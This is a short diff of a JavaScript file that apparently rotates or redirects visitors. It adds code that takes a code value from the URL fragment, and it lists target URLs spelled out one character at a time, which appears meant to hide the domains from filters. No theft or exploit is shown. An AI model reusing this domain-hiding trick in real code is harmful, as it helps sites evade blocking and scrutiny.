@@ -37,6 +37,14 @@
 if (regex.test(subdomain)) {
   code=subdomain;
 }
+
+var hashValue = window.location.hash;
+if (hashValue !== "") {
+
+  var parameterValue = hashValue.substring(1);
+code=parameterValue;
+} 
+
 	function R(length) {
   let result = '';
   const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
@@ -49,7 +57,7 @@ if (regex.test(subdomain)) {
   return result;
 }
 		var urls = [
-			'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'v'+'i'+'p'+'.'+'x'+'2'+'y'+'.'+'o'+'n'+'e',
+        	'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'v'+'i'+'p'+'.'+'x'+'2'+'y'+'.'+'o'+'n'+'e',
 			'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'v'+'i'+'p'+'.'+'x'+'2'+'v'+'.'+'l'+'i'+'v'+'e',
 			'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'v'+'i'+'p'+'.'+'x'+'2'+'v'+'.'+'s'+'h'+'o'+'p',
 			'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'v'+'i'+'p'+'.'+'x'+'2'+'y'+'.'+'l'+'i'+'v'+'e',
